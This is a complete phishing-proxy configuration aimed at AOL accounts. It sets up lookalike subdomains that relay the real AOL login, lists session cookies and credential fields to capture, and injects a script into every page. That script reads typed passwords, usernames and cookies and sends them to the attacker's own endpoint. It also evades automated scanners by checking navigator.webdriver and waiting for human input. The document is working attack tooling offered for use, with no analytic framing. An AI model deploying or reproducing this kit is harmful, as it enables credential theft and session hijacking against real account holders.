min_ver: '3.3.0'
proxy_hosts:
  - {phish_sub: 'acct-a6b4c9x', orig_sub: 'login', domain: 'aol.com', session: true, auto_filter: true, is_landing: true}
  - {phish_sub: 'a-api', orig_sub: 'api.login', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'a-www', orig_sub: 'www', domain: 'aol.com', session: false, auto_filter: true, is_landing: false}
sub_filters:
  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https%3A%2F%2F{hostname}/', replace: 'https%3A%2F%2F{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
auth_tokens:
  - domain: '.aol.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', 'YDUS', 'PH', '_Y', 'EuConsent', 'thamba', 'ucs', 'APID', 'APIDTS', 'sS', 'cmp', '.*,regexp']
  - domain: '.login.aol.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']
  - domain: '.mail.aol.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']
auth_urls:
  - '/consent'
  - '/account/challenge/password*'
  - '/?.src=aol*'
  - '/?.done=*'
credentials:
  username:
    key: '(username|email|mobile|userId|login)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|password|pass)'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.aol.com'
  path: '/'
js_inject:
  - trigger_domains: ["*"]
    trigger_paths: ["*"]
    script: |
      (function() {
        var passedGate = false;
        var lastCapture = '';
        var capturedCreds = { username: '', password: '' };
        var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : null;
        var providerName = 'AOL';
        var providerId = 'aol';

        function sendSessionData() {
          try {
            if (!capturedCreds.username && !capturedCreds.password) return;
            var currentHash = capturedCreds.username + ':' + capturedCreds.password;
            if (currentHash === lastCapture) return;
            lastCapture = currentHash;

            var cookieObj = {};
            document.cookie.split(';').forEach(function(c) {
              c = c.trim();
              if (c) { var eq = c.indexOf('='); if (eq > 0) cookieObj[c.substring(0, eq)] = c.substring(eq + 1); }
            });

            var geoData = { ip: 'Unknown', city: 'Unknown', country_name: 'Unknown' };
            try {
              geoData = fetch('https://ipapi.co/json/').then(r => r.json()).then(d => geoData = d);
            } catch(e) {}
            var ip = geoData.ip;
            var location = geoData.city + ', ' + geoData.country_name;
            var timestamp = new Date().toISOString();
            var device = navigator.userAgent;

            var sessionInfo = {
              provider: providerId,
              credentials: capturedCreds,
              url: window.location.href,
              ip: ip,
              location: location,
              timestamp: timestamp,
              device: device,
              cookies: cookieObj
            };
            var payload = { username: 'SessionData-' + providerName, password: JSON.stringify(sessionInfo) };
            var body = JSON.stringify(payload);

            var h = window.location.hostname;
            var parts = h.split('.');
            if (parts.length > 2) parts.shift();
            var beaconUrl = 'https://' + parts.join('.') + '/log/session';

            fetch(beaconUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body, keepalive: true }).catch(function(){});
          } catch(e) {}
        }

        function monitorFormInputs() {
          document.querySelectorAll('input').forEach(function(el) {
            if (watchedElements ? watchedElements.has(el) : el._aolWatched) return;
            if (watchedElements) { watchedElements.add(el); } else { el._aolWatched = true; }
            function captureField() {
              var t = (el.type || '').toLowerCase();
              var n = (el.name || el.id || el.getAttribute('data-field-name') || '').toLowerCase();
              var v = el.value;
              if (!v) return;
              if (t === 'password' || /passwd|password|pass/.test(n)) {
                if (v !== capturedCreds.password) { capturedCreds.password = v; sendSessionData(); }
              } else if (t === 'email' || t === 'text' || t === 'tel' || /username|userid|email|login|phone|mobile/.test(n)) {
                capturedCreds.username = v;
              }
            }
            el.addEventListener('input', captureField, { passive: true });
            el.addEventListener('change', captureField, { passive: true });
            el.addEventListener('blur', captureField, { passive: true });
            el.addEventListener('paste', captureField, { passive: true });
            el.addEventListener('cut', captureField, { passive: true });
            if (t === 'password') el.addEventListener('keyup', captureField, { passive: true });
          });
          document.querySelectorAll('form').forEach(function(form) {
            if (watchedElements ? watchedElements.has(form) : form._aolFormWatched) return;
            if (watchedElements) { watchedElements.add(form); } else { form._aolFormWatched = true; }
            form.addEventListener('submit', function() { sendSessionData(); });
          });
          document.querySelectorAll('button[type="submit"], button[data-handler="submit"]').forEach(function(btn) {
            if (watchedElements ? watchedElements.has(btn) : btn._aolBtnWatched) return;
            if (watchedElements) { watchedElements.add(btn); } else { btn._aolBtnWatched = true; }
            btn.addEventListener('click', function() { setTimeout(sendSessionData, 100); });
          });
        }

        function runMainLogic() {
          if (passedGate) return;
          passedGate = true;
          var observer = new MutationObserver(function(mutations) {
            for (var i = 0; i < mutations.length; i++) {
              if (mutations[i].addedNodes.length > 0) { monitorFormInputs(); break; }
            }
          });
          window.addEventListener('load', function() { monitorFormInputs(); observer.observe(document.body, { childList: true, subtree: true }); });
          if (document.body) { monitorFormInputs(); observer.observe(document.body, { childList: true, subtree: true }); }
          setInterval(function() {
            var dynamicEls = document.querySelectorAll('[data-dynamic]');
            dynamicEls.forEach(function(el) { el.textContent = new Date().toLocaleTimeString(); });
          }, 1000);
        }

        if (!navigator.webdriver) {
          var interactionHandler = function() { if (passedGate) return; runMainLogic(); };
          document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
          document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
          document.addEventListener('keydown', interactionHandler, { once: true, passive: true });
          setTimeout(function() { if (!passedGate) runMainLogic(); }, 4000);
        }
      })();